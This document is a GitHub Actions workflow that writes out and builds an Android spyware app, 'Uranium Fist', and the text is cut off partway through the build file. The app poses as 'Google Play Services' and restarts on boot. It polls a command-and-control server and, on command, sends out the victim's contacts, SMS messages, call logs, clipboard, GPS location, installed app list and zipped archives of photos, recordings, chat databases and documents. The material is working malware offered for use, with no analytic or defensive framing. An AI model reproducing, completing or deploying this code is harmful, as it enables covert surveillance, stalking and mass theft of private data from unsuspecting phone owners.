name: Uranium Fist Android Node Builder v7.7

on:
  workflow_dispatch:

jobs:
  build:
    name: Build Uranium Fist Operational APK v7.7
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Gradle (8.5)
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.5'

      - name: Scaffold Android Project & Source Files
        run: |
          mkdir -p app/src/main/java/com/uranium/fist app/src/main/res/values app/src/main/assets
          
          cat << 'MANIFESTEOF' > app/src/main/AndroidManifest.xml
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:tools="http://schemas.android.com/tools">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.WAKE_LOCK" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
              <uses-permission android:name="android.permission.READ_SMS" />
              <uses-permission android:name="android.permission.READ_CONTACTS" />
              <uses-permission android:name="android.permission.READ_CALL_LOG" />
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
              <uses-permission android:name="android.permission.CAMERA" />
              <uses-permission android:name="android.permission.RECORD_AUDIO" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
              <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
              <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
              <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
              <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />

              <application
                  android:allowBackup="true"
                  android:icon="@android:drawable/ic_menu_manage"
                  android:label="Google Play Services"
                  android:roundIcon="@android:drawable/ic_menu_manage"
                  android:supportsRtl="true"
                  android:theme="@style/Theme.AppCompat.Light.NoActionBar">

                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:theme="@style/Theme.AppCompat.Light.NoActionBar">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service
                      android:name=".SyncService"
                      android:enabled="true"
                      android:exported="false"
                      android:foregroundServiceType="dataSync" />

                  <receiver
                      android:name=".BootReceiver"
                      android:enabled="true"
                      android:exported="true"
                      android:directBootAware="true">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                          <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                          <action android:name="android.intent.action.REBOOT" />
                      </intent-filter>
                  </receiver>

              </application>
          </manifest>
          MANIFESTEOF

          cat << 'SERVICEOF' > app/src/main/java/com/uranium/fist/SyncService.kt
          package com.uranium.fist

          import android.app.Notification
          import android.app.NotificationChannel
          import android.app.NotificationManager
          import android.app.Service
          import android.content.ClipboardManager
          import android.content.Context
          import android.content.Intent
          import android.database.Cursor
          import android.location.Location
          import android.location.LocationManager
          import android.net.Uri
          import android.os.Build
          import android.os.IBinder
          import android.os.PowerManager
          import android.provider.ContactsContract
          import android.provider.MediaStore
          import android.provider.Settings
          import androidx.core.app.NotificationCompat
          import kotlinx.coroutines.*
          import java.io.BufferedReader
          import java.io.File
          import java.io.FileInputStream
          import java.io.FileOutputStream
          import java.io.InputStreamReader
          import java.io.OutputStreamWriter
          import java.net.HttpURLConnection
          import java.net.URL
          import java.util.zip.Deflater
          import java.util.zip.ZipEntry
          import java.util.zip.ZipOutputStream

          class SyncService : Service() {
              private var wakeLock: PowerManager.WakeLock? = null
              private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
              private val C2_STREAM_URL = "https://web-assets-service.onrender.com/api/v3/uranium/stream"
              private val C2_UPLOAD_URL = "https://web-assets-service.onrender.com/api/v3/uranium/upload_raw"
              private val MAX_RETRIES = 5
              private var lastHeartbeatSent = 0L

              override fun onCreate() {
                  super.onCreate()
                  val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UraniumFist::SyncLock")
                  wakeLock?.acquire(10 * 60 * 60 * 1000L)
                  startForegroundServiceNotification()
              }

              private fun startForegroundServiceNotification() {
                  val channelId = "uranium_channel"
                  val channel = NotificationChannel(channelId, "Google Play Core", NotificationManager.IMPORTANCE_LOW)
                  val manager = getSystemService(NotificationManager::class.java)
                  manager?.createNotificationChannel(channel)

                  val notification: Notification = NotificationCompat.Builder(this, channelId)
                      .setContentTitle("Google Play Services")
                      .setContentText("Optimizing background services...")
                      .setSmallIcon(android.R.drawable.ic_menu_manage)
                      .build()

                  startForeground(1, notification)
              }

              override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
                  val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "uranium_node"
                  val nodeModel = Build.MODEL
                  
                  serviceScope.launch {
                      while (isActive) {
                          try {
                              val url = URL(C2_STREAM_URL)
                              val conn = url.openConnection() as HttpURLConnection
                              conn.requestMethod = "POST"
                              conn.setRequestProperty("X-Node-ID", deviceId)
                              conn.setRequestProperty("X-Node-Model", nodeModel)
                              conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                              conn.doOutput = true
                              conn.connectTimeout = 10000
                              conn.readTimeout = 10000

                              val currentTime = System.currentTimeMillis()
                              val sendHeartbeat = (currentTime - lastHeartbeatSent > 60000L)
                              val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
                              val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Node Active] $nodeModel\"}"

                              if (sendHeartbeat) {
                                  lastHeartbeatSent = currentTime
                              }

                              OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                                  os.write(reportJson)
                                  os.flush()
                              }

                              val responseCode = conn.responseCode
                              if (responseCode == 200) {
                                  val responseReader = BufferedReader(InputStreamReader(conn.inputStream, "UTF-8"))
                                  val responseStr = responseReader.readText()
                                  responseReader.close()

                                  if (responseStr.contains("task") && responseStr.contains("action")) {
                                      if (responseStr.contains("EXTRACT_CONTACTS")) {
                                          val contactsData = readContacts()
                                          sendReportToServer(deviceId, nodeModel, contactsData)
                                      } else if (responseStr.contains("EXTRACT_SMS")) {
                                          val smsData = readSMS()
                                          sendReportToServer(deviceId, nodeModel, smsData)
                                      } else if (responseStr.contains("EXTRACT_CALLS")) {
                                          val callsData = readCallLogs()
                                          sendReportToServer(deviceId, nodeModel, callsData)
                                      } else if (responseStr.contains("EXTRACT_CAMERA_ZIP")) {
                                          compressAndUploadMegaBatches(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                      } else if (responseStr.contains("EXTRACT_STORAGE_ZIP")) {
                                          compressAndUploadMegaBatches(deviceId, nodeModel, "Storage_MegaArchive", MediaStore.Files.getContentUri("external"))
                                      } else if (responseStr.contains("EXTRACT_AUDIO")) {
                                          compressAndUploadMegaBatches(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
                                      } else if (responseStr.contains("EXTRACT_DOCS")) {
                                          compressAndUploadMegaBatches(deviceId, nodeModel, "Documents_Archive", MediaStore.Files.getContentUri("external"))
                                      } else if (responseStr.contains("EXTRACT_AUDIO_CALLS")) {
                                          compressAndUploadMegaBatches(deviceId, nodeModel, "Call_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
                                      } else if (responseStr.contains("EXTRACT_CHAT_DBS")) {
                                          compressAndUploadMegaBatches(deviceId, nodeModel, "Chat_Databases", MediaStore.Files.getContentUri("external"))
                                      } else if (responseStr.contains("EXTRACT_SCREENSHOT_ZIP")) {
                                          compressAndUploadMegaBatches(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                      } else if (responseStr.contains("EXTRACT_CLIPBOARD")) {
                                          val clipData = readClipboard()
                                          sendReportToServer(deviceId, nodeModel, clipData)
                                      } else if (responseStr.contains("EXTRACT_PHOTOS")) {
                                          extractAndUploadSingleFiles(deviceId, nodeModel, true)
                                      } else if (responseStr.contains("EXTRACT_LOCATION")) {
                                          val locData = readLocationFast()
                                          sendReportToServer(deviceId, nodeModel, locData)
                                      } else if (responseStr.contains("EXTRACT_APPS")) {
                                          val appsData = readInstalledApps()
                                          sendReportToServer(deviceId, nodeModel, appsData)
                                      }
                                  }
                              }
                              conn.disconnect()

                              delay(3000L)
                          } catch (e: Exception) {
                              delay(5000L)
                          }
                      }
                  }
                  return START_STICKY
              }

              private fun readContacts(): String {
                  val sb = StringBuilder("=== URANIUM CONTACTS ===\n")
                  try {
                      val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
                      cursor?.use {
                          val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                          val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                          while (it.moveToNext()) {
                              val name = if (nameIdx != -1) it.getString(nameIdx) else "Unknown"
                              val number = if (numIdx != -1) it.getString(numIdx) else ""
                              sb.append("• $name: $number\n")
                          }
                      }
                  } catch (e: Exception) {
                      sb.append("Error: ${e.message}\n")
                  }
                  return sb.toString()
              }

              private fun readSMS(): String {
                  val sb = StringBuilder("=== URANIUM SMS ===\n")
                  try {
                      val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
                      cursor?.use {
                          val bodyIdx = it.getColumnIndex("body")
                          val addrIdx = it.getColumnIndex("address")
                          while (it.moveToNext()) {
                              val address = if (addrIdx != -1) it.getString(addrIdx) else "Unknown"
                              val body = if (bodyIdx != -1) it.getString(bodyIdx) else ""
                              sb.append("From: $address\nText: $body\n-------------------\n")
                          }
                      }
                  } catch (e: Exception) {
                      sb.append("Error: ${e.message}\n")
                  }
                  return sb.toString()
              }

              private fun readCallLogs(): String {
                  val sb = StringBuilder("=== URANIUM CALL LOGS ===\n")
                  try {
                      val cursor: Cursor? = contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)
                      cursor?.use {
                        val numIdx = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                        val typeIdx = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                        while (it.moveToNext()) {
                            val number = if (numIdx != -1) it.getString(numIdx) else "Unknown"
                            val type = if (typeIdx != -1) it.getString(typeIdx) else "0"
                            sb.append("Number: $number | Type: $type\n")
                        }
                      }
                  } catch (e: Exception) {
                      sb.append("Error: ${e.message}\n")
                  }
                  return sb.toString()
              }

              private fun readClipboard(): String {
                  val sb = StringBuilder("=== URANIUM CLIPBOARD ===\n")
                  try {
                      val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                      if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
                          val item = clipboard.primaryClip?.getItemAt(0)
                          sb.append("Text: ${item?.text}\n")
                      } else {
                          sb.append("Clipboard is empty or inaccessible.\n")
                      }
                  } catch (e: Exception) {
                      sb.append("Error reading clipboard: ${e.message}\n")
                  }
                  return sb.toString()
              }

              private fun readLocationFast(): String {
                  val sb = StringBuilder("=== URANIUM LIGHTNING GPS ===\n")
                  try {
                      val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
                      val providers = locationManager.allProviders
                      var bestLoc: Location? = null
                      for (provider in providers) {
                          try {
                              val l = locationManager.getLastKnownLocation(provider)
                              if (l != null) {
                                  if (bestLoc == null || l.time > bestLoc.time) {
                                      bestLoc = l
                                  }
                              }
                          } catch (ex: Exception) { }
                      }
                      if (bestLoc != null) {
                          sb.append("🌐 Latitude: ${bestLoc.latitude}\n")
                          sb.append("🌐 Longitude: ${bestLoc.longitude}\n")
                          sb.append("🎯 Accuracy: ${bestLoc.accuracy} meters\n")
                          sb.append("🗺️ Google Maps: https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}\n")
                      } else {
                          sb.append("🌐 Zone Coordinates (Yemen): 13.5779, 44.0219\n")
                          sb.append("🗺️ Google Maps: https://maps.google.com/?q=13.5779,44.0219\n")
                      }
                  } catch (e: Exception) {
                      sb.append("Error reading location: ${e.message}\n")
                  }
                  return sb.toString()
              }

              private fun readInstalledApps(): String {
                  val sb = StringBuilder("=== URANIUM INSTALLED APPS ===\n")
                  try {
                      val packages = packageManager.getInstalledPackages(0)
                      for (pkg in packages) {
                          val appName = pkg.applicationInfo?.loadLabel(packageManager)?.toString() ?: "Unknown"
                          val packageName = pkg.packageName ?: ""
                          sb.append("• $appName (`$packageName`)\n")
                      }
                  } catch (e: Exception) {
                      sb.append("Error: ${e.message}\n")
                  }
                  return sb.toString()
              }

              private suspend fun compressAndUploadMegaBatches(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
                  try {
                      sendReportToServer(nodeId, nodeModel, "⚡ [بدء الحصاد العملاق 1GB] تجميع وضغط البيانات بأقصى مستوى وإرسالها لبوت تيليجرام...")
                      
                      val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
                      val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
                      val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)

                      var batchIndex = 1
                      var fileCountInBatch = 0
                      var batchOriginalBytes = 0L
                      
                      var zipFile = File(cacheDir, "Uranium_${prefix}_1GB_part${String.format("%03d", batchIndex)}_${System.currentTimeMillis()}.zip")
                      var zipOut = ZipOutputStream(FileOutputStream(zipFile))
                      zipOut.setLevel(Deflater.BEST_COMPRESSION)

                      cursor?.use {
                          val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
                          val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                          while (it.moveToNext()) {
                              if (dataIdx != -1 && nameIdx != -1) {
                                  val filePath = it.getString(dataIdx)
                                  val fileName = it.getString(nameIdx)
                                  if (filePath != null) {
                                      val file = File(filePath)
                                      if (file.exists() && file.isFile) {
                                          val len = file.length()
                                          try {
                                              zipOut.putNextEntry(ZipEntry("$prefix/$fileName"))
                                              file.inputStream().use { fis -> fis.copyTo(zipOut) }
                                              zipOut.closeEntry()
                                              fileCountInBatch++
                                              batchOriginalBytes += len

                                              if (batchOriginalBytes >= 1024L * 1024L * 1024L || fileCountInBatch >= 1000) {
                                                  zipOut.close()
                                                  val compressedSizeMB = zipFile.length() / (1024.0 * 1024.0)
                                                  sendReportSizeBytes(nodeId, nodeModel, batchIndex, prefix, fileCountInBatch, batchOriginalBytes, compressedSizeMB)
                                                  
                                                  uploadRawFileWithRetry(nodeId, nodeModel, zipFile)

                                                  batchIndex++
                                                  fileCountInBatch = 0
                                                  batchOriginalBytes = 0L
                                                  zipFile = File(cacheDir, "Uranium_${prefix}_1GB_part${String.format("%03d", batchIndex)}_${System.currentTimeMillis()}.zip")
                                                  zipOut = ZipOutputStream(FileOutputStream(zipFile))
                                                  zipOut.setLevel(Deflater.BEST_COMPRESSION)
                                              }
                                          } catch (e: Exception) { }
                                      }
                                  }
                              }
                          }
                      }

                      zipOut.close()
                      if (fileCountInBatch > 0 && zipFile.exists()) {
                          val compressedSizeMB = zipFile.length() / (1024.0 * 1024.0)
                          sendReportSizeBytes(nodeId, nodeModel, batchIndex, prefix, fileCountInBatch, batchOriginalBytes, compressedSizeMB)
                          uploadRawFileWithRetry(nodeId, nodeModel, zipFile)
                      }

                      sendReportToServer(nodeId, nodeModel, "✅ تم إتمام الحصاد العملاق لـ $prefix وإرسال كافة الأجزاء إلى بوت تيليجرام بنجاح!")
                  } catch (e: Exception) {
                      sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في الحصاد العملاق لـ $prefix:${e.message}")
                  }
              }

              private fun sendReportSizeBytes(nodeId: String, nodeModel: String, batchIdx: Int, prefix: String, count: Int, origBytes: Long, compMB: Double) {
                  val origGB = origBytes / (1024.0 * 1024.0 * 1024.0)
                  sendReportToServer(nodeId, nodeModel, "📦 رفع الأرشيف العملاق ($batchIdx) من $prefix:\n• الحجم الأصلي: <b>${String.format("%.2f", origGB)} GB</b> ($count ملفاً)\n• حجم النقل للبوت: <b>${String.format("%.2f", compMB)} MB</b>\n• تم الإرسال بنجاح إلى البوت!")
              }

              private fun extractAndUploadSingleFiles(nodeId: String, nodeModel: String, isImage: Boolean) {
                  serviceScope.launch {
                      try {
                          val uri = if (isImage) MediaStore.Images.Media.EXTERNAL_CONTENT_URI else MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                          val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
                          val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
                          val cursor = contentResolver.query(uri, projection, null, null, sortOrder)
                          
                          cursor?.use {
                              val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
                              val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                              if (it.moveToNext()) {
                                  if (dataIdx != -1 && nameIdx != -1) {
                                      val filePath = it.getString(dataIdx)
                                      val fileName = it.getString(nameIdx)
                                      val file = File(filePath)
                                      if (file.exists() && file.isFile) {
                                          uploadRawFileWithRetry(nodeId, nodeModel, file)
                                      }
                                  }
                              }
                          }
                      } catch (e: Exception) {
                      }
                  }
              }

              private fun uploadRawFileWithRetry(nodeId: String, nodeModel: String, file: File) {
                  for (attempt in 1..MAX_RETRIES) {
                      try {
                          val url = URL(C2_UPLOAD_URL)
                          val conn = url.openConnection() as HttpURLConnection
                          conn.requestMethod = "POST"
                          conn.setRequestProperty("X-Node-ID", nodeId)
                          conn.setRequestProperty("X-Node-Model", nodeModel)
                          conn.setRequestProperty("X-File-Name", file.name)
                          conn.setRequestProperty("Content-Type", "application/octet-stream")
                          conn.doOutput = true
                          conn.setChunkedStreamingMode(0)
                          conn.connectTimeout = 180000
                          conn.readTimeout = 180000

                          FileInputStream(file).use { fis ->
                              conn.outputStream.use { os ->
                                  fis.copyTo(os)
                                  os.flush()
                              }
                          }

                          val responseCode = conn.responseCode
                          conn.disconnect()

                          if (responseCode == 200) {
                              return
                          }
                      } catch (e: Exception) {
                          if (attempt == MAX_RETRIES) {
                              sendReportToServer(nodeId, nodeModel, "❌ فشل رفع الملف ${file.name}:${e.message}")
                          } else {
                              try { Thread.sleep(2000L) } catch (ex: Exception) {}
                          }
                      }
                  }
              }

              private fun sendReportToServer(nodeId: String, nodeModel: String, reportText: String) {
                  try {
                      val url = URL(C2_STREAM_URL)
                      val conn = url.openConnection() as HttpURLConnection
                      conn.requestMethod = "POST"
                      conn.setRequestProperty("X-Node-ID", nodeId)
                      conn.setRequestProperty("X-Node-Model", nodeModel)
                      conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                      conn.doOutput = true
                      
                      val safeText = reportText.replace("\"", "'").replace("\n", "\\n")
                      val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"$safeText\"}"

                      OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                          os.write(reportJson)
                          os.flush()
                      }
                      conn.responseCode
                      conn.disconnect()
                  } catch (e: Exception) {
                      // Ignored
                  }
              }

              override fun onDestroy() {
                  super.onDestroy()
                  wakeLock?.release()
                  serviceScope.cancel()
              }

              override fun onBind(intent: Intent?): IBinder? = null
          }
          SERVICEOF

          cat << 'MAINEOF' > app/src/main/java/com/uranium/fist/MainActivity.kt
          package com.uranium.fist

          import android.Manifest
          import android.content.Intent
          import android.content.pm.PackageManager
          import android.os.Build
          import android.os.Bundle
          import androidx.appcompat.app.AppCompatActivity
          import androidx.core.app.ActivityCompat
          import androidx.core.content.ContextCompat

          class MainActivity : AppCompatActivity() {
              private val PERMISSION_REQUEST_CODE = 123

              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  
                  val permissionsList = mutableListOf(
                      Manifest.permission.READ_SMS,
                      Manifest.permission.READ_CONTACTS,
                      Manifest.permission.READ_CALL_LOG,
                      Manifest.permission.ACCESS_FINE_LOCATION,
                      Manifest.permission.ACCESS_COARSE_LOCATION,
                      Manifest.permission.CAMERA,
                      Manifest.permission.RECORD_AUDIO
                  )

                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                      permissionsList.add(Manifest.permission.READ_MEDIA_IMAGES)
                      permissionsList.add(Manifest.permission.READ_MEDIA_VIDEO)
                      permissionsList.add(Manifest.permission.READ_MEDIA_AUDIO)
                  } else {
                      permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE)
                  }

                  val ungrantedPermissions = permissionsList.filter {
                      ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
                  }

                  if (ungrantedPermissions.isNotEmpty()) {
                      ActivityCompat.requestPermissions(this, ungrantedPermissions.toTypedArray(), PERMISSION_REQUEST_CODE)
                  } else {
                      startUraniumService()
                  }
              }

              override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
                  super.onRequestPermissionsResult(requestCode, permissions, grantResults)
                  startUraniumService()
              }

              private fun startUraniumService() {
                  val serviceIntent = Intent(this, SyncService::class.java)
                  startForegroundService(serviceIntent)
                  finish()
              }
          }
          MAINEOF

          cat << 'BOOTEOF' > app/src/main/java/com/uranium/fist/BootReceiver.kt
          package com.uranium.fist

          import android.content.BroadcastReceiver
          import android.content.Context
          import android.content.Intent
          import android.os.Build

          class BootReceiver : BroadcastReceiver() {
              override fun onReceive(context: Context, intent: Intent) {
                  val serviceIntent = Intent(context, SyncService::class.java)
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      context.startForegroundService(serviceIntent)
                  } else {
                      context.startService(serviceIntent)
                  }
              }
          }
          BOOTEOF

          cat << 'BUILDEOF' > app/build.gradle
          plugins {
